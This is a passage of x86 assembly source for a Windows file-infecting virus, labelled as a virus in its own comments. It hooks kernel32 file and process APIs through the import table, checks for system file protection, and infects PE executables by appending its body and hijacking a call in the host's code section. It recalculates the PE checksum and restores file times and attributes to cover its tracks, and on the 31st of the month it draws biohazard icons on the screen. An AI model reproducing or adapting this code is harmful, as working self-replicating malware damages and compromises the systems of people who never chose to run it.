MapViewOfFile endp

;#################################################################
;# Unmap View Of File
;#  In: eax=FileAddr
;#  Out: (eax not zero) Error: eax=00h
;#################################################################
UnmapViewOfFile proc
    push    eax                     ; Push File Addr
    call    [@UnmapViewOfFile+ebp]
    ret
UnmapViewOfFile endp

;#################################################################
;# Close Handle
;#  In: eax=Handle
;#  Out: (eax not zero) Error: eax=00h
;#################################################################
CloseHandle proc
    push    eax                     ; Push Open Handle
    call    [@CloseHandle+ebp]
    ret
CloseHandle endp

;#################################################################
;# Load Sfc Library
;#  In: No Input
;#  Out: No Output
;#################################################################
LoadSfcLibrary proc
    lea     edi,[@SfcN+ebp]         ; Load SfcIsFileProtected api
    push    edi                     ; Can be in sfc.dll or in sfc_os.dll
    call    [@GetModuleHandleA+ebp] ;  so take care using GetProcAddress
    or      eax,eax
    jnz     LoadSfc@1
    push    edi
    call    [@LoadLibraryA+ebp]     ; Load the library
    or      eax,eax
    jz      LoadSfc@2
LoadSfc@1:
    lea     esi,[@SfcIsFileProtectedN+ebp]
    push    esi
    push    eax
    call    [@GetProcAddress+ebp]   ; And get the api address
LoadSfc@2:                              ; If SfcIsFileProtected=NULL then no Sfc present
    mov     [@SfcIsFileProtected+ebp],eax
    ret
LoadSfcLibrary endp

;#################################################################
;# Load New Library
;#  In: edi->LibraryName esi->ApisCrc32Struct
;#  Out: (eax not zero) Error: eax=00h
;#################################################################
LoadNewLibrary proc
    push    edi
    call    [@GetModuleHandleA+ebp] ; Is the Lib in Memory?
    or      eax,eax
    jnz     LoadNew@1
    push    edi                     ; Nop, try to load Lib
    call    [@LoadLibraryA+ebp]
    or      eax,eax                 ; Check if we have the Lib Base
    jz      LoadNew@2
LoadNew@1:
    call    GetAllApiAddress        ; And get the Apis we need!
LoadNew@2:
    ret
LoadNewLibrary endp

;#################################################################
;# Free New Library
;#  In: edi->LibraryName
;#  Out: (eax not zero) Error: eax=00h
;#################################################################
FreeNewLibrary proc
    push    edi
    call    [@GetModuleHandleA+ebp] ; Get the Lib Base in Memory
    or      eax,eax
    jz      FreeNew@1               ; If error, skip
    push    eax
    call    [@FreeLibrary+ebp]      ; And Free our memory space
FreeNew@1:
    ret
FreeNewLibrary endp

;#################################################################
;# Asciiz 2 Unicode
;#  In: esi->FileNameAsciiz edi->Buffer
;#  Out: edi->FileNameUnicode
;#################################################################
Asciiz2Unicode proc
    push    esi edi                 ; We need an Unicode parameter
    xor     eax,eax                 ;  so make a sting change
Asciiz@1:
    lodsb                           ; Pass from byte to word char
    stosw
    or      eax,eax
    jnz     Asciiz@1
    pop     edi esi                 ; Now we have finished
    ret
Asciiz2Unicode endp

;#################################################################
;# Check Sum Mapped File
;#  In: esi->@FileAddr ecx=@FileSize
;#  Out: eax=CheckSumMappedFile Error: eax=00h
;#################################################################
CheckSumMappedFile proc
    push    esi                     ; Save some registers
    push    ebx
    push    ecx
    inc     ecx
    shr     ecx,01h                 ; Is a Revised version of CheckSumMappedFile API
    call    PartialCheckSum         ; Call to make the partial CheckSum
    add     esi,[esi+3Ch]
    mov     bx,ax                   ; We have to make some changes after and...
    xor     edx,edx
    inc     edx
    mov     ecx,edx
    mov     ax,[esi+58h]            ; Get the actual file checksum
    cmp     bx,ax
    adc     ecx,-01h
    sub     bx,cx
    sub     bx,ax
    mov     ax,[esi+5Ah]
    cmp     bx,ax
    adc     edx,-01h
    sub     bx,dx
    sub     bx,ax
    xor     eax,eax
    mov     ax,bx
    pop     ecx
    add     eax,ecx                 ; Here is the CRC File CheckSum in eax
    pop     ebx                     ; Restore register and finish
    pop     esi 
    ret
CheckSumMappedFile endp

;#################################################################
;# Partial Check Sum
;#  In: esi->@FileAddr ecx=@FileSize
;#  Out: eax=CheckSumMappedFile Error: eax=00h
;#################################################################
PartialCheckSum proc
    push    esi                     ; Save register
    xor     eax,eax
    shl     ecx,01h
    je      PartialCheck@0
    test    esi,02h
    je      PartialCheck@1
    movzx   edx,word ptr[esi]       ; This is a version of the CheckSumMappedFile
    add     eax,edx                 ;  API... to make a CRC32 of Infected Files
    adc     eax,00h
    add     esi,02h
    sub     ecx,02h
PartialCheck@1:
    mov     edx,ecx                 ; Only makes the partial Check Sum, used by
    and     edx,07h                 ;  other process that calculate the final
    sub     ecx,edx                 ;  Check Sum of Mapped File
    je      PartialCheck@2
    test    ecx,08h
    je      PartialCheck@3
    add     eax,[esi]
    adc     eax,[esi+04h]
    adc     eax,00h
    add     esi,08h
    sub     ecx,08h
    je      PartialCheck@2
PartialCheck@3:                         ; Iteration 3
    test    ecx,10h
    je      PartialCheck@4
    add     eax,[esi]
    adc     eax,[esi+04h]
    adc     eax,[esi+08h]
    adc     eax,[esi+0Ch]
    adc     eax,00h
    add     esi,10h
    sub     ecx,10h
    je      PartialCheck@2
PartialCheck@4:                         ; Iteration 4
    test    ecx,20h
    je      PartialCheck@5
    add     eax,[esi]
    adc     eax,[esi+04h]
    adc     eax,[esi+08h]
    adc     eax,[esi+0Ch]
    adc     eax,[esi+10h]
    adc     eax,[esi+14h]
    adc     eax,[esi+18h]
    adc     eax,[esi+1Ch]
    adc     eax,00h
    add     esi,20h
    sub     ecx,20h
    je      PartialCheck@2
PartialCheck@5:                         ; Iteration 5
    test    ecx,40h
    je      PartialCheck@6
    add     eax,[esi]
    adc     eax,[esi+04h]
    adc     eax,[esi+08h]
    adc     eax,[esi+0Ch]
    adc     eax,[esi+10h]
    adc     eax,[esi+14h]
    adc     eax,[esi+18h]
    adc     eax,[esi+1Ch]
    adc     eax,[esi+20h]
    adc     eax,[esi+24h]
    adc     eax,[esi+28h]
    adc     eax,[esi+2Ch]
    adc     eax,[esi+30h]
    adc     eax,[esi+34h]
    adc     eax,[esi+38h]
    adc     eax,[esi+3Ch]
    adc     eax,00h
    add     esi,40h
    sub     ecx,40h
    je      PartialCheck@2
PartialCheck@6:                         ; Iteration 6
    add     eax,[esi]
    adc     eax,[esi+04h]
    adc     eax,[esi+08h]
    adc     eax,[esi+0Ch]
    adc     eax,[esi+10h]
    adc     eax,[esi+14h]
    adc     eax,[esi+18h]
    adc     eax,[esi+1Ch]
    adc     eax,[esi+20h]
    adc     eax,[esi+24h]
    adc     eax,[esi+28h]
    adc     eax,[esi+2Ch]
    adc     eax,[esi+30h]
    adc     eax,[esi+34h]
    adc     eax,[esi+38h]
    adc     eax,[esi+3Ch]
    adc     eax,[esi+40h]
    adc     eax,[esi+44h]
    adc     eax,[esi+48h]
    adc     eax,[esi+4Ch]
    adc     eax,[esi+50h]
    adc     eax,[esi+54h]
    adc     eax,[esi+58h]
    adc     eax,[esi+5Ch]
    adc     eax,[esi+60h]
    adc     eax,[esi+64h]
    adc     eax,[esi+68h]
    adc     eax,[esi+6Ch]
    adc     eax,[esi+70h]
    adc     eax,[esi+74h]
    adc     eax,[esi+78h]
    adc     eax,[esi+7Ch]
    adc     eax,00h
    add     esi,80h
    sub     ecx,80h
    jne     PartialCheck@6
PartialCheck@2:
    test    edx,edx
    je      PartialCheck@0
PartialCheck@7:                         ; Iteration 7
    movzx   ecx,word ptr[esi]
    add     eax,ecx
    adc     eax,00h
    add     esi,02h
    sub     edx,02h
    jne     PartialCheck@7
PartialCheck@0:
    mov     edx,eax
    shr     edx,10h
    and     eax,0000FFFFh
    add     eax,edx
    mov     edx,eax
    shr     edx,10h
    add     eax,edx                 ; Make a final logic and
    and     eax,0000FFFFh           ; Get the partial check sum
    pop     esi                     ; Pop registers
    ret
PartialCheckSum endp

;#################################################################
;# Get Delta
;#  In: No Input
;#  Out: ebp=DeltaOffset
;#################################################################
GetDelta proc
    cld
    call    GetDelta@1              ; Just a strange get delta function
GetDelta@2:
    mov     esi,esp                 ; Let's look in Stack the return address
    lodsd
    jmp     GetDelta@3
GetDelta@1:
    xor     eax,eax
    jz      GetDelta@2
GetDelta@3:
    sub     eax,offset GetDelta@2
    mov     ebp,eax                 ; We have the delta offset in ebp
    add     esp,04h
    ret
GetDelta endp

;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
;#################################################################
;# Virus Payload
;#################################################################
;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@

;#################################################################
;# Payload
;#  In: No Input
;#  Out: No Output
;#################################################################
Payload proc
    lea     eax,[@SystemTime+ebp]
    push    eax                     ; Get the actual date
    call    [@GetSystemTime+ebp]
    or      eax,eax
    jz      Pay@1
    cmp     word ptr[@SystemTime.wDay+ebp],1Fh
    jnz     Pay@1
    lea     edi,[@User32N+ebp]      ; If 31th let's rock!
    lea     esi,[@User32+ebp]       ; Loading some graphic apis
    call    LoadNewLibrary
    or      eax,eax
    jz      Pay@1
    call    RunPayload              ; And launch the graphic payload
    lea     edi,[@User32N+ebp]
    call    FreeNewLibrary          ; Be smart and free the library
Pay@1:
    ret
Payload endp

;#################################################################
;# Run Payload
;#  In: No Input
;#  Out: No Output
;#################################################################
RunPayload proc
    xor     ebx,ebx                 ; First get the resolution of screen
    push    SM_CXSCREEN             ; Get the X width
    call    [@GetSystemMetrics+ebp]
    or      eax,eax
    jz      RunPay@1
    shr     eax,01h                 ; We want the center coords
    mov     [@Xcoord+ebp],eax       ; Get the Y width
    push    SM_CYSCREEN
    call    [@GetSystemMetrics+ebp]
    or      eax,eax
    jz      RunPay@1
    shr     eax,01h
    mov     [@Ycoord+ebp],eax
    push    ebx                     ; Handle of the Main Desktop window
    call    [@GetDC+ebp]
    or      eax,eax
    jz      RunPay@1
    mov     [@DeviceCtx+ebp],eax
    push    IDI_WARNING
    push    ebx
    call    [@LoadIconA+ebp]        ; Loading a Warning Icon
    or      eax,eax
    jz      RunPay@2
    mov     [@HandleIcon+ebp],eax
    call    DrawBioHazard           ; Well... ready for paint!!!
RunPay@2:
    mov     eax,[@DeviceCtx+ebp]
    push    eax                     ; Release the Main Desktop window
    push    ebx
    call    [@ReleaseDC+ebp]
RunPay@1:
    ret
RunPayload endp

;#################################################################
;# Draw Icon
;#  In: esi=Xcoord edi=Ycoord
;#  Out: (eax not zero) Error: eax=00h
;#################################################################
DrawIcon proc
    push    [@HandleIcon+ebp]       ; Handle of warning Icon
    push    edi                     ; Y coord
    push    esi                     ; X coord
    push    [@DeviceCtx+ebp]        ; Device context (Main window)
    call    [@DrawIcon+ebp]         ; Draw an Icon
    ret
DrawIcon endp

;#################################################################
;# Draw Bio Hazard
;#  In: No Input
;#  Out: No Output
;#################################################################
DrawBioHazard proc
    push    ebx
    mov     esi,[@Xcoord+ebp]       ; Save the center coords
    mov     edi,[@Ycoord+ebp]
    mov     ebx,0168h               ; Start with 360º
DrawBio@1:
    push    esi edi
    mov     [@Degrees+ebp],ebx
    fldpi
    fimul   dword ptr[@Degrees+ebp]
    fidiv   dword ptr[@Const+ebp]
    fcos
    fimul   dword ptr[@Radius+ebp]
    frndint
    fistp   dword ptr[@Result+ebp]
    add     esi,[@Result+ebp]       ; Get Radius * cos (Angle)
    fldpi
    fimul   dword ptr[@Degrees+ebp]
    fidiv   dword ptr[@Const+ebp]
    fsin
    fimul   dword ptr[@Radius+ebp]
    frndint
    fistp   dword ptr[@Result+ebp]
    sub     edi,[@Result+ebp]       ; Get Radius * sin (Angle)
    call    DrawIcon                ; And paint please
    sub     edi,70h                 ; We want four circles...
    cmp     ebx,3Ch                 ;  painting at the same time
    jb      DrawOk@1
    cmp     ebx,78h
    ja      DrawOk@1
    jmp     DrawBio@2
DrawOk@1:
    call    DrawIcon                ; Skip some parts and tachan!!!
DrawBio@2:
    sub     esi,61h                 ; We'll have a nice BioHazard picture
    add     edi,0A8h
    cmp     ebx,0B4h
    jb      DrawOk@2
    cmp     ebx,0F0h
    ja      DrawOk@2
    jmp     DrawBio@3
DrawOk@2:
    call    DrawIcon                ; And again the same
DrawBio@3:
    add     esi,0C2h
    cmp     ebx,012Ch
    jb      DrawOk@3
    cmp     ebx,0168h
    ja      DrawOk@3
    jmp     DrawBio@4
DrawOk@3:
    call    DrawIcon
DrawBio@4:
    pop     edi esi
    dec     ebx                     ; Well, another degree less
    jnz     DrawBio@1               ; Go on with the painting
    push    MB_ICONHAND
    call    [@MessageBeep+ebp]      ; Just play a Beep sound... tic, tac
    pop     ebx
    ret
DrawBioHazard endp

;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
;#################################################################
;# Virus Per-Process Residency
;#################################################################
;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@

;#################################################################
;# Set All Hooks
;#  In: esi->ApisCrc32Struct edi->OffsetsHooksStruct
;#  Out: (eax not zero) Error: eax=00h
;#################################################################
SetAllHooks proc
    push    edi esi
    mov     ebx,[@ImageBase+ebp]
    mov     esi,ebx                 ; Take the Base Addr of Process
    add     esi,[ebx+3Ch]           ; Go to the PE header
    add     esi,80h                 ; And after... to the Import Table
    lodsd
    or      eax,eax                 ; Check if we have Import Table
    jz      SetAll@1
    add     eax,ebx
    mov     ecx,eax
SetAll@2:
    mov     esi,[ecx+0Ch]           ; Looking for Kernel32 import module
    or      esi,esi
    jz      SetAll@1
    add     esi,ebx
    lodsd
    or      eax,20202020h           ; Make LowCase the string
    cmp     eax,'nrek'
    jnz     SetAll@3
    lodsd
    or      eax,20202020h
    cmp     eax,'23le'
    jz      SetAll@4                ; We've the correct module, great!
SetAll@3:
    add     ecx,14h                 ; Ups!... give me another one
    jmp     SetAll@2
SetAll@4:
    mov     esi,[ecx+10h]           ; Go to FirstChunkData
    or      esi,esi                 ; If null go out
    jz      SetAll@1
    add     esi,ebx                 ; Set some register for a big double loop
    mov     ecx,esi
    pop     edi
    pop     ebx
SetAll@9:
    cmp     byte ptr[edi],0EEh      ; The last api to hook?
    jz      SetAll@5                ; If last go out
    mov     edx,[edi+04h]           ; Load the api address
SetAll@8:
    lodsd                           ; Load an address for Import Table
    or      eax,eax                 ; If last go back
    jz      SetAll@6
    cmp     edx,eax                 ; It's equal? yep... fine
    jnz     SetAll@8
    push    ecx
    call    [@GetCurrentProcess+ebp]
    xor     ecx,ecx
    sub     esi,04h                 ; Writing what we want in Import Table
    push    ecx
    push    04h
    mov     ecx,[ebx]
    add     ecx,ebp
    mov     [@Result+ebp],ecx       ; Just set the hooker function
    mov     ecx,esi
    lea     esi,[@Result+ebp]
    push    esi
    push    ecx
    push    eax
    call    [@WriteProcessMemory+ebp]
    pop     ecx
SetAll@6:
    add     edi,08h                 ; Go on with more Apis to hook
    add     ebx,04h
    mov     esi,ecx
    jmp     SetAll@9
SetAll@5:
    xor     eax,eax                 ; Fine... we have no errors
    inc     eax
    ret
SetAll@1:
    xor     eax,eax                 ; Ups... Sth gone wrong
    pop     esi edi
    ret
SetAllHooks endp

;#################################################################
;# Generic Hooks
;#  In: No Input
;#  Out: No Output
;#################################################################

;#################################################################
;# Hook for CreateFileA
;#################################################################
HookCreateFileA proc
    pushad                          ; Save registes
    pushfd
    call    GetDelta                ; Get the correct Delta
    mov     esi,[esp+28h]
    call    HookNewPath             ; Looking for a new path and Find Files
    mov     eax,[@CreateFileA+ebp]
    lea     edi,[@HookJumpA+ebp]    ; Set the next jump to the hooked api
    stosd
    popfd                           ; Pop registers
    popad
    push    20202020h
@HookJumpA      equ     $-4
    ret
HookCreateFileA endp

;#################################################################
;# Hook for MoveFileA
;#################################################################
HookMoveFileA proc
    pushad                          ; Save registes
    pushfd
    call    GetDelta                ; Get the correct Delta
    mov     esi,[esp+28h]
    call    HookNewPath             ; Looking for a new path and Find Files
    mov     eax,[@MoveFileA+ebp]
    lea     edi,[@HookJumpB+ebp]    ; Set the next jump to the hooked api
    stosd
    popfd                           ; Pop registers
    popad
    push    20202020h
@HookJumpB      equ     $-4
    ret
HookMoveFileA endp

;#################################################################
;# Hook for CopyFileA
;#################################################################
HookCopyFileA proc
    pushad                          ; Save registes
    pushfd
    call    GetDelta                ; Get the correct Delta
    mov     esi,[esp+28h]
    call    HookNewPath             ; Looking for a new path and Find Files
    mov     eax,[@CopyFileA+ebp]
    lea     edi,[@HookJumpC+ebp]    ; Set the next jump to the hooked api
    stosd
    popfd                           ; Pop registers
    popad
    push    20202020h
@HookJumpC      equ     $-4
    ret
HookCopyFileA endp

;#################################################################
;# Hook for CreateProcessA
;#################################################################
HookCreateProcessA proc
    pushad                          ; Save registes
    pushfd
    call    GetDelta                ; Get the correct Delta
    mov     esi,[esp+28h]
    call    HookNewPath             ; Looking for a new path and Find Files
    mov     eax,[@CreateProcessA+ebp]
    lea     edi,[@HookJumpD+ebp]    ; Set the next jump to the hooked api
    stosd
    popfd                           ; Pop registers
    popad
    push    20202020h
@HookJumpD      equ     $-4
    ret
HookCreateProcessA endp

;#################################################################
;# Hook for SetFileAttributesA
;#################################################################
HookSetFileAttributesA proc
    pushad                          ; Save registes
    pushfd
    call    GetDelta                ; Get the correct Delta
    mov     esi,[esp+28h]
    call    HookNewPath             ; Looking for a new path and Find Files
    mov     eax,[@SetFileAttributesA+ebp]
    lea     edi,[@HookJumpE+ebp]    ; Set the next jump to the hooked api
    stosd
    popfd                           ; Pop registers
    popad
    push    20202020h
@HookJumpE      equ     $-4
    ret
HookSetFileAttributesA endp

;#################################################################
;# Hook for GetFileAttributesA
;#################################################################
HookGetFileAttributesA proc
    pushad                          ; Save registes
    pushfd
    call    GetDelta                ; Get the correct Delta
    mov     esi,[esp+28h]
    call    HookNewPath             ; Looking for a new path and Find Files
    mov     eax,[@GetFileAttributesA+ebp]
    lea     edi,[@HookJumpF+ebp]    ; Set the next jump to the hooked api
    stosd
    popfd                           ; Pop registers
    popad
    push    20202020h
@HookJumpF      equ     $-4
    ret
HookGetFileAttributesA endp

;#################################################################
;# Hook for SearchPathA
;#################################################################
HookSearchPathA proc
    pushad                          ; Save registes
    pushfd
    call    GetDelta                ; Get the correct Delta
    mov     esi,[esp+28h]
    call    HookNewPath             ; Looking for a new path and Find Files
    mov     eax,[@SearchPathA+ebp]
    lea     edi,[@HookJumpG+ebp]    ; Set the next jump to the hooked api
    stosd
    popfd                           ; Pop registers
    popad
    push    20202020h
@HookJumpG      equ     $-4
    ret
HookSearchPathA endp

;#################################################################
;# Hook New Path
;#  In: esi->StringWithPath
;#  Out: (eax not zero) Error: eax=00h
;#################################################################
HookNewPath proc
    call    GetPath                 ; Just give a new path
    or      eax,eax                 ; If not correct path... skip it
    jz      HookNew@1
    lea     esi,[@PathOne+ebp]
    push    esi                     ; Get the actual Dir
    push    MAX_PATH
    call    [@GetCurrentDirectoryA+ebp]
    or      eax,eax
    jz      HookNew@1
    lea     esi,[@PathTwo+ebp]      ; Change to the new path
    push    esi
    call    [@SetCurrentDirectoryA+ebp]
    or      eax,eax
    jz      HookNew@1
    call    LoadSfcLibrary          ; Check if Sfc is present and load it
    mov     edi,05h
    call    FindDirectory           ; And find more new files
    mov     eax,[@SfcIsFileProtected+ebp]
    or      eax,eax
    jz      HookNew@2
    lea     edi,[@SfcN+ebp]         ; Free the Sfc library
    call    FreeNewLibrary
HookNew@2:
    lea     esi,[@PathOne+ebp]      ; Well, time to come back to the old dir
    push    esi
    call    [@SetCurrentDirectoryA+ebp]
HookNew@1:
    ret
HookNewPath endp

;#################################################################
;# Get Path
;#  In: esi->StringWithPath
;#  Out: (eax not zero) Error: eax=00h
;#################################################################
GetPath proc
    or      esi,esi                 ; Check the null pointer
    jz      GetPath@2
    mov     edi,esi                 ; Get the String long
    call    GetStringLong
    mov     ecx,eax
    lea     edi,[@PathTwo+ebp]
    push    eax                     ; Set some registers and copy
    push    edi                     ;  the new path string to a buffer
    cld
    rep     movsb
    pop     edi
    pop     ecx
    add     edi,ecx
GetPath@1:
    dec     edi                     ; Looking for a \ in String
    dec     eax
    jz      GetPath@2
    cmp     byte ptr[edi],'\'
    jnz     GetPath@1
    mov     ax,'\'                  ; If found patch it with final zero
    stosw
    ret                             ; Finish without error
GetPath@2:
    xor     eax,eax                 ; Oh... :( an error
    ret
GetPath endp

;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
;#################################################################
;# Virus Core Functions
;#################################################################
;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@

;#################################################################
;# Create Clean Copy
;#  In: No Input
;#  Out: (eax not zero) Error: eax=00h
;#################################################################
CreateCleanCopy proc
    push    edi esi edx             ; Save register
    push    @VirusBodySize
    push    GPTR
    call    [@GlobalAlloc+ebp]      ; Get some memory free space
    or      eax,eax
    jz      CreateClean@1
    mov     [@VirusBuffer+ebp],eax
    mov     edi,eax
    lea     esi,[@VirusBodyBegin+ebp]
    mov     ecx,@VirusBodySize
    cld
    rep     movsb                   ; Move our virus body to memory reserved
    xor     eax,eax
    inc     eax
CreateClean@1:
    pop     edx esi edi             ; If not memory skip it now!
    ret
CreateCleanCopy endp

;#################################################################
;# Delete Clean Copy
;#  In: No Input
;#  Out: (eax zero) Error: eax not zero
;#################################################################
DeleteCleanCopy proc
    push    [@VirusBuffer+ebp]      ; Just free the allocated memory
    call    [@GlobalFree+ebp]
    ret
DeleteCleanCopy endp

;#################################################################
;# Infect File
;#  In: @FindData @FileHandle
;#  Out: eax=01h Error: eax=00h
;#################################################################
InfectFile proc
    push    ebx edi
    mov     eax,[@FindData.WFD_nFileSizeLow+ebp]
    add     eax,@VirusSize
    mov     ecx,[@AlignFactor+ebp]
    call    Align                   ; Get the new host size
    mov     ecx,75h
    call    Align                   ; And add a size padding
    mov     [@NewHostSize+ebp],eax  ; Save the final aligned size
    mov     edi,eax
    mov     eax,[@OpenHandle+ebp]
    xor     esi,esi
    call    FileMapping             ; Make a map of file
    or      eax,eax
    jz      Infect@1
    mov     [@MapHandle+ebp],eax
    call    MapViewOfFile           ; And map it into memory
    or      eax,eax
    jz      Infect@2
    mov     [@FileAddr+ebp],eax
    call    DoInfectStuff           ; Time to infect file
    or      eax,eax
    jz      Infect@3                ; If error, trunc file and go out
    mov     eax,[@FileAddr+ebp]
    call    UnmapViewOfFile         ; Unmap file from memory
    mov     eax,[@MapHandle+ebp]
    call    CloseHandle             ; Close map
    mov     ebx,[@NewHostSize+ebp]
    call    TruncFile               ; Trunc file to the new size
    lea     eax,[@FindData.WFD_ftLastWriteTime+ebp]
    push    eax
    sub     eax,08h                 ; Recover the old file time
    push    eax
    sub     eax,08h
    push    eax
    push    [@OpenHandle+ebp]
    call    [@SetFileTime+ebp]
    mov     eax,[@OpenHandle+ebp]   ; Close file
    call    CloseHandle
    mov     eax,[@FindData.WFD_dwFileAttributes+ebp]
    push    eax                     ; Recover the old file attributes
    lea     esi,[@FindData.WFD_szFileName+ebp]
    push    esi
    call    [@SetFileAttributesA+ebp]
    xor     eax,eax
    inc     eax                     ; Fine! we have infected one file
    pop     edi ebx
    ret
Infect@3:
    mov     eax,[@FileAddr+ebp]     ; Ups! error... be smart and unmap file
    call    UnmapViewOfFile
Infect@2:
    mov     eax,[@MapHandle+ebp]    ; Close map of file
    call    CloseHandle
    mov     ebx,[@NewHostSize+ebp]
    call    TruncFile               ; Trunc file to the old file size
Infect@1:
    lea     eax,[@FindData.WFD_ftLastWriteTime+ebp]
    push    eax
    sub     eax,08h
    push    eax                     ; Set file time
    sub     eax,08h
    push    eax
    push    [@OpenHandle+ebp]
    call    [@SetFileTime+ebp]
    mov     eax,[@OpenHandle+ebp]   ; Close file handle
    call    CloseHandle
    mov     eax,[@FindData.WFD_dwFileAttributes+ebp]
    push    eax                     ; Recover the old file attributes
    lea     esi,[@FindData.WFD_szFileName+ebp]
    push    esi
    call    [@SetFileAttributesA+ebp]
    xor     eax,eax                 ; Error... try again
    pop     edi ebx
    ret
InfectFile endp

;#################################################################
;# Patch Virus Entry Point
;#  In: No Input
;#  Out: No Output
;#################################################################
PatchVirusEntryPoint proc
    lea     edi,[@ReturnHost+ebp]   ; Let's change virus entry point
    mov     eax,[@DefaultVirusBegin+ebp]
    stosd
    mov     edi,eax
    mov     ebx,[@CallType+ebp]
    or      ebx,ebx
    jz      PatchVirus@1
    mov     eax,0FFh                ; If masm call insert "inc [esp]"
    stosb
    mov     eax,2404h
    stosw
PatchVirus@1:
    mov     eax,25FFh               ; Insert jmp [@offset api]
    stosw
    mov     eax,[@EpoCall+ebp]
    stosd   
    ret
PatchVirusEntryPoint endp

;#################################################################
;# Do Epo Stuff
;#  In: ebx=@FileAddr
;#  Out: eax=01h Error: eax=00h
;#################################################################
DoEpoStuff proc
    pushad
    call    SetEpoSeh
    mov     esp,[esp+08h]
    jmp     ResetEpoSeh             ; Set Seh in Epo process
SetEpoSeh:                              ;  cos we need handle page faults
    xor     eax,eax
    push    dword ptr fs:[eax]
    mov     fs:[eax],esp
    mov     esi,[ebx+3Ch]
    mov     edi,ebx                 ; Save the FileAddr in ebx
    add     edi,esi
    mov     esi,edi
    add     esi,78h                 ; Go to the image section headers
    mov     eax,[edi+74h]
    shl     eax,03h
    add     esi,eax
    movzx   ecx,word ptr[edi+06h]   ; Take the number of sections
    mov     edx,[edi+28h]           ; Take the entry point of host
DoEpo@1:
    mov     eax,[esi+0Ch]
    cmp     edx,eax
    jc      DoEpo@2
    add     eax,[esi+08h]           ; Iteratate till we have the code
    cmp     edx,eax                 ;  section (using the entry point)
    jc      DoEpo@3
DoEpo@2:
    add     esi,28h                 ; Try with other section
    loop    DoEpo@1
    jmp     ResetEpoSeh             ; No code section... ups! go out
DoEpo@3:
    sub     edx,[esi+0Ch]
    mov     ecx,[esi+10h]
    sub     ecx,edx                 ; Set in ecx a counter of bytes
    jc      ResetEpoSeh
    add     edx,[esi+14h]
    add     edx,ebx                 ; Make edx point to the code section
    push    esi
    mov     esi,edx
    xor     eax,eax
    mov     [@PatchOffset+ebp],eax  ; Make offset zero at start
DoEpo@4:
    lodsw
    cmp     ax,15FFh                ; Is a Masm generated call?
    jz      CheckMasm
    cmp     al,0E8h                 ; Is a Tasm generated call?
    jz      CheckTasm
    dec     esi
    loop    DoEpo@4                 ; Go on and check it all till the end
    jmp     DoEpoError@1            ; No calls found...error
CheckMasm:
    lodsd                           ; Take the offset next to call
    call    IsImportTable           ;  and check if points to the Imports
    or      eax,eax
    jnz     PatchMasm               ; Great!... patch it now
    sub     esi,05h
    jmp     DoEpo@4                 ; Nop, go on
CheckTasm:
    dec     esi
    lodsd                           ; Take the relative next to call
    push    esi
    add     esi,eax
    call    IsCodeSection           ; Is in code section?
    or      eax,eax
    jz      CheckTasmError
    lodsw
    cmp     ax,25FFh                ; Is a jump?
    jz      PatchTasm               ; Fine!... go and patch it
CheckTasmError:
    pop     esi
    sub     esi,04h
    jmp     DoEpo@4                 ; Nop, try again
PatchMasm:
    mov     [@OldEpoCall+ebp],eax   ; Save the offset of call
    sub     esi,06h
    mov     [@PatchOffset+ebp],esi
    xor     eax,eax
    inc     eax
    mov     [@OldCallType+ebp],eax
    call    GetRandom
    test    eax,01h                 ; Get a random number and
    jz      MakePatch               ;  randomize the patch offset
    inc     esi
    jmp     DoEpo@4
PatchTasm:
    lodsd
    mov     [@OldEpoCall+ebp],eax   ; Save the offset of call
    pop     esi
    sub     esi,05h
    mov     [@PatchOffset+ebp],esi
    xor     eax,eax
    mov     [@OldCallType+ebp],eax
    call    GetRandom               ; Get a random number and
    test    eax,01h                 ;  randomize the patch offset
    jz      MakePatch
    inc     esi
    jmp     DoEpo@4
MakePatch:
    call    PatchCodeSection        ; Patch the instruction with a call to virus
    pop     esi
    xor     eax,eax
    pop     dword ptr fs:[eax]      ; Reset the Epo Seh
    pop     eax
    popad
    xor     eax,eax
    inc     eax
    ret                             ; Bye!!!
DoEpoError@1:
    mov     esi,[@PatchOffset+ebp]  ; Check if we have found an offset
    or      esi,esi
    jnz     MakePatch               ; Yep... go and patch it!
    pop     esi                     ; Ups... error, pop registers and skip
ResetEpoSeh:
    xor     eax,eax
    pop     dword ptr fs:[eax]      ; Reset the Epo Seh... we made a page fault
    pop     eax
    popad
    xor     eax,eax
    ret
DoEpoStuff endp

;#################################################################
;# Is Code Section
;#  In: esi->File Section
;#  Out: eax=01h Error: eax=00h
;#################################################################
IsCodeSection proc
    push    edi ecx
    mov     edi,[esp+10h]           ; Look in stack for section pointer
    mov     ecx,[edi+14h]
    add     ecx,ebx
    cmp     esi,ecx                 ; Check if esi is inside code section
    jc      IsCode@1
    add     ecx,[edi+10h]
    cmp     esi,ecx
    jnc     IsCode@1
    xor     eax,eax                 ; Ok, no problem... go on
    inc     eax
    pop     ecx edi
    ret
IsCode@1:
    xor     eax,eax                 ; Agh... try again
    pop     ecx edi
    ret
IsCodeSection endp

;#################################################################
;# Is Import Table
;#  In: eax=offset in File
;#  Out: (eax not zero) Error: eax=00h
;#################################################################
IsImportTable proc
    pushad                          ; Save registers
    mov     edi,ebx
    mov     edx,eax
    add     edi,[ebx+3Ch]           ; Go to PE header
    mov     esi,edi
    add     esi,78h
    mov     eax,[edi+74h]
    shl     eax,03h
    add     esi,eax                 ; Go to the section headers
    movzx   ecx,word ptr[edi+06h]
    sub     edx,[edi+34h]           ; Make rva address
    push    edx
    mov     edx,[edi+80h]           ; Get the imports rva
    or      edx,edx
    jz      IsImport@4
IsImport@1:
    mov     eax,[esi+0Ch]           ; Loop till get the import section
    cmp     edx,eax
    jc      IsImport@2
    add     eax,[esi+08h]
    cmp     edx,eax
    jc      IsImport@3
IsImport@2:
    add     esi,28h                 ; Try with other section header
    loop    IsImport@1
    jmp     IsImport@4              ; No more sections? ups...
IsImport@3:
    pop     edx
    cmp     edx,eax                 ; Look if our rva points inside
    jnc     IsImport@5              ;  the import section
